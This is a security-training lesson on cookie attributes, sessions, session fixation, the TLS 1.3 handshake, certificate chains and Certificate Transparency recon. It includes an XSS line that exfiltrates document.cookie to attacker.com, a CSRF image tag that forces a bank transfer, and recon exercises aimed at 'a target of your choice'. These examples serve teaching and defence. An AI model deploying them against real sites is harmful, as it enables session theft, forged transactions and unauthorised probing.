---
title: "HTTP Cookies, Sessions and HTTPS/TLS Handshake"
tags: [foundation, networking, http, cookies, sessions, tls, https, certificate-chain,
       attacker-mindset, session-hijacking]
module: 01-Foundation-01
day: 5
related_topics:
  - HTTP Fundamentals (Day 004)
  - TLS Attacks (Day 006)
  - CSRF attacks
  - Session fixation and hijacking
  - JWT tokens
---

# Day 005 — HTTP Cookies, Sessions and HTTPS/TLS Handshake

## Goals

By the end of this lesson you will be able to:

1. Explain what an HTTP cookie is, its attributes, and what each attribute does for security.
2. Describe what happens when each cookie attribute (`HttpOnly`, `Secure`, `SameSite`) is missing.
3. Explain how server-side sessions work and how session tokens are used to maintain state.
4. Describe session fixation and session hijacking — conditions and exploitation steps.
5. Trace the TLS 1.3 handshake step-by-step and name what is exchanged at each step.
6. Explain the certificate chain (leaf → intermediate → root CA) and how browsers validate it.
7. Explain certificate transparency and why it is a recon goldmine for attackers.
8. Describe the difference between TLS 1.2 and TLS 1.3 from a security perspective.

---

## Prerequisites

- [Day 004 — DNS Attacks and HTTP Fundamentals](DAY-0004-DNS-Attacks-and-HTTP-Fundamentals.md)

---

## Main Content — Part 1: HTTP Cookies and Sessions

### 1. The Problem: HTTP is Stateless

HTTP has no memory. Each request is independent — the server does not know if request #2
came from the same client as request #1. But every real application needs state:

- "Is this user logged in?"
- "What items are in their cart?"
- "What page are they on in the checkout flow?"

The solution: the client carries a **token** that the server can look up. That token is
delivered and stored via **cookies**.

---

### 2. What is a Cookie?

A cookie is a small piece of data set by the server, stored in the browser, and sent back
with every subsequent request to that domain. The server uses `Set-Cookie` to set them;
the browser uses `Cookie` to send them.

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123xyz; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session=abc123xyz
```

**Cookie attributes that matter for security:**

| Attribute | What it does | Missing = vulnerability |
|---|---|---|
| `HttpOnly` | JavaScript cannot access this cookie | XSS can steal the cookie |
| `Secure` | Cookie only sent over HTTPS | Cookie sent over HTTP; MITM can steal it |
| `SameSite=Strict` | Cookie not sent on cross-site requests | CSRF attacks possible |
| `SameSite=Lax` | Cookie sent on top-level navigations (GET) | POST CSRF still blocked |
| `SameSite=None` | Cookie sent on all cross-site requests | Must have `Secure`; CSRF risk |
| `Domain` | Scope of cookie (e.g. `.example.com`) | Sent to all subdomains |
| `Path` | URL path scope | Cookie sent to all paths under this prefix |
| `Max-Age` / `Expires` | How long cookie persists | Session cookie vs persistent cookie |

---

### 3. Cookie Security Attacks

#### XSS + Missing HttpOnly

If `HttpOnly` is not set, JavaScript can read the cookie:

```javascript
// Attacker's payload on a vulnerable page:
fetch('https://attacker.com/steal?c=' + document.cookie)
```

**Defence:** Set `HttpOnly` on all session cookies. The browser will not expose them to JS.

#### SSL Stripping + Missing Secure Flag

Without `Secure`, a session cookie is transmitted over HTTP as well as HTTPS. An attacker
who performs a MITM and strips TLS can capture it in plaintext.

**Defence:** Set `Secure` on all authentication cookies. Deploy HSTS to force HTTPS.

#### CSRF + Missing or Broken SameSite

Cross-Site Request Forgery exploits the browser's automatic cookie sending behaviour:

```html
<!-- Attacker's page at evil.com -->
<img src="https://bank.example.com/transfer?to=attacker&amount=5000">
```

If the victim is logged in to `bank.example.com` and visits `evil.com`, the browser
automatically includes the session cookie on the request. The bank executes the transfer.

**`SameSite=Strict`** prevents this — the cookie is not sent when the request originates
from a different site, even on top-level navigations.

**`SameSite=Lax`** (modern browsers' default) allows the cookie on top-level GET navigations
but blocks it on cross-origin form submissions and AJAX requests. POST-based CSRF is blocked;
GET-based state-changing requests remain vulnerable.

#### Cookie Scope: Domain and Path

```
Set-Cookie: session=abc; Domain=.example.com
```

This sends the cookie to all subdomains: `api.example.com`, `admin.example.com`,
`staging.example.com`. If any subdomain is compromised (or taken over), it receives
the session cookie for the main application.

**Bug bounty implication:** A subdomain takeover on `staging.example.com` combined with
a `Domain=.example.com` session cookie = full session hijack of all users. High-severity.

---

### 4. How Server-Side Sessions Work

The most common session model:

```
1. User logs in → server validates credentials
2. Server creates a session record: { session_id: "abc123", user_id: 42, role: "admin" }
3. Server stores this in memory, Redis, or a database
4. Server sends: Set-Cookie: session=abc123; HttpOnly; Secure
5. Client stores cookie; sends it with every subsequent request
6. Server looks up "abc123" in session store → retrieves user context
7. On logout: server deletes session record; cookie becomes invalid
```

**Session ID requirements:**
- **Cryptographically random** — must not be predictable or enumerable.
- **Long enough** — at minimum 128 bits of entropy. Most frameworks use 256+ bits.
- **Not reused** — new session ID after every authentication event.

**Session fixation attack:**
1. Attacker obtains a valid session ID (not yet authenticated): `session=KNOWN_ID`.
2. Attacker tricks victim into using that session ID (e.g. via URL parameter: `?sessionid=KNOWN_ID`).
3. Victim logs in. If the server does NOT rotate the session ID after login, the session is
   now authenticated but the attacker knows the ID.
4. Attacker uses `KNOWN_ID` to access the authenticated session.

**Fix:** Always generate a new session ID immediately after successful authentication.

---

## Main Content — Part 2: HTTPS and TLS

### 5. Why TLS Exists

HTTP is plaintext. Anyone on the network path (your ISP, a coffee shop router, a MITM) can
read everything you send and receive. TLS (Transport Layer Security) wraps the HTTP exchange
in a cryptographic tunnel that provides:

1. **Confidentiality:** Traffic is encrypted — eavesdroppers see ciphertext.
2. **Integrity:** Any modification to the data in transit is detectable.
3. **Authentication:** The server proves its identity using a certificate.

HTTPS = HTTP over TLS. The `S` means TLS is protecting the connection, not that the
application is secure.

---

### 6. TLS 1.3 Handshake — Step by Step

TLS 1.3 (RFC 8446, 2018) reduced the handshake to 1 round-trip from TLS 1.2's 2:

```
Client                          Server
  │                               │
  │──── ClientHello ────────────►│
  │   TLS version, ciphers,       │
  │   random, key_share (ECDHE)  │
  │                               │
  │◄─── ServerHello ─────────────│
  │     chosen cipher, key_share, │
  │     random                    │
  │                               │
  │◄─── {Certificate} ───────────│  (encrypted)
  │     server's TLS certificate  │
  │                               │
  │◄─── {CertificateVerify} ─────│
  │     signature proving server  │
  │     owns the private key      │
  │                               │
  │◄─── {Finished} ──────────────│
  │     HMAC of entire handshake  │
  │                               │
  │──── {Finished} ─────────────►│
  │                               │
  │════════ Encrypted Data ═══════│
```

**Key points:**
- `{}` denotes messages encrypted with the handshake keys derived immediately from the
  key exchange — even certificate details are hidden from passive observers in TLS 1.3.
- The cipher suite is negotiated in the Hello messages. TLS 1.3 removes all weak ciphers;
  only AEAD ciphers (AES-GCM, ChaCha20-Poly1305) are allowed.
- **Perfect Forward Secrecy (PFS):** TLS 1.3 requires ephemeral key exchange (ECDHE or DHE).
  Even if the server's private key is compromised later, past sessions cannot be decrypted.
  This was optional in TLS 1.2 — and frequently disabled.

---

### 7. TLS 1.2 vs TLS 1.3 — Security Comparison

| Feature | TLS 1.2 | TLS 1.3 |
|---|---|---|
| Handshake round trips | 2 | 1 |
| Weak ciphers allowed | Yes (RC4, 3DES, static RSA) | No — AEAD only |
| Forward secrecy | Optional | Mandatory |
| Certificate details visible | Yes (in plaintext) | No (encrypted) |
| Downgrade attacks | Possible (POODLE, BEAST) | Prevented by design |
| 0-RTT resumption | No | Yes (replay risk) |

TLS 1.0 and 1.1 are deprecated. Any server still running them is misconfigured and
worth noting in a bug report.

---

### 8. The Certificate Chain

A TLS certificate proves identity. It is issued by a Certificate Authority (CA) that the
browser trusts. The chain works like this:

```
Root CA (self-signed, in browser trust store)
  └── Intermediate CA (signed by Root CA)
        └── Leaf Certificate (signed by Intermediate CA)
              Subject: www.example.com
              Public Key: (used for TLS)
              Valid: 2025-01-01 to 2026-01-01
```

**Validation steps the browser performs:**
1. Is the certificate issued for this hostname? (CN or SAN match)
2. Is it within the valid date range?
3. Is the signature chain valid back to a trusted root CA?
4. Is the certificate revoked? (check OCSP or CRL)
5. (Optional) Does it match a pinned certificate?

**Attacker relevance:**
- A **self-signed certificate** triggers a browser warning. Attackers use them in MITM tools
  like Burp Suite (hence installing the Burp CA cert during setup).
- **Wildcard certificates** (`*.example.com`) cover all first-level subdomains but not
  second-level ones (`*.*.example.com` is not standard). A compromised wildcard cert is
  devastating.
- **Certificate Transparency (CT) logs** are public, append-only logs of every certificate
  ever issued. You can query them via `crt.sh` to find every subdomain that has ever had
  a certificate — excellent for recon.

---

### 9. Certificate Transparency as a Recon Tool

Every publicly trusted TLS certificate must be logged to a CT log. This means you can find
subdomains that companies may consider private just by searching certificate databases:

```bash
# Find all certificates issued for *.example.com via crt.sh
curl -s "https://crt.sh/?q=%.example.com&output=json" \
  | jq '.[].name_value' | sort -u | sed 's/\\n/\n/g'

# Use subfinder which queries CT logs automatically
subfinder -d example.com -silent

# Use amass which queries multiple sources including CT
amass enum -passive -d example.com
```

**What you find:**
- Internal staging environments (`staging.example.com`, `dev-api.example.com`).
- Acquisition integration endpoints (`legacy-partner.example.com`).
- Forgotten services (`old-vpn.example.com`) that may not receive security updates.

This technique has found thousands of real bug bounty vulnerabilities — the certificate log
is a map of every TLS-enabled endpoint an organisation has ever deployed.

---

## Key Takeaways

1. **`HttpOnly` prevents JS access.** Missing = XSS leads to session theft. This is one of
   the most common OWASP Top 10 misconfigurations you will see.
2. **`Secure` prevents plaintext transmission.** Missing = session cookie exposed over HTTP.
3. **`SameSite=Strict/Lax`** is the modern CSRF defence. `SameSite=None` with `Secure` is
   required for cross-site cookies but opens CSRF risk — needs explicit CSRF token.
4. **Session IDs must be rotated on login.** If they are not, session fixation is possible.
5. **TLS 1.3 is the standard.** Any server on TLS 1.0/1.1 is misconfigured. TLS 1.2 without
   forward secrecy is a bug bounty finding at many programmes.
6. **Certificate Transparency is your reconnaissance friend.** Every cert ever issued for a
   domain is publicly logged. `crt.sh` is one of your first recon tools.
7. **HTTPS ≠ secure application.** TLS protects the channel, not the content. An HTTPS site
   can still have SQLi, XSS, IDOR, and every other application-layer vulnerability.

---

## Exercises

### Exercise 1 — Cookie Attribute Analysis

For each `Set-Cookie` header, identify every security issue and describe the attack it enables:

1. `Set-Cookie: session=abc123`
2. `Set-Cookie: auth=tok_xyz; HttpOnly; Path=/`
3. `Set-Cookie: remember=user42; Secure; Max-Age=2592000; Domain=.example.com`
4. `Set-Cookie: csrf_token=ABC; SameSite=None`
5. `Set-Cookie: session=s3cr3t; HttpOnly; Secure; SameSite=Strict; Path=/`

---

### Exercise 2 — TLS Handshake Trace

Open `https://example.com` in your browser with developer tools open (Network tab → click the
request → Security tab). Answer:

1. What TLS version is being used?
2. What cipher suite was negotiated?
3. Who issued the certificate? What is the full certificate chain?
4. What is the certificate's validity period?
5. Does the certificate have Subject Alternative Names (SANs)? List them.

Now run from the command line:
```bash
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3
```
6. What cipher suites are offered when you force TLS 1.2 vs TLS 1.3?

---

### Exercise 3 — Certificate Transparency Recon

1. Go to `https://crt.sh/?q=%.google.com&output=json` (or any large organisation).
   How many unique subdomain certificates do you find?
2. Find a subdomain that looks like it might be an internal or staging environment.
3. Try to access it with `curl -sI https://[subdomain]`. What response do you get?
4. Run `subfinder -d [any-domain]` on a target of your choice and compare the results to
   what you find manually via `crt.sh`.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 004 — DNS Attacks and HTTP Fundamentals](DAY-0004-DNS-Attacks-and-HTTP-Fundamentals.md)*
*Next: [Day 006 — TLS Attacks, HTTP/2 and Proxies](DAY-0006-TLS-Attacks-HTTP2-and-Proxies.md)*
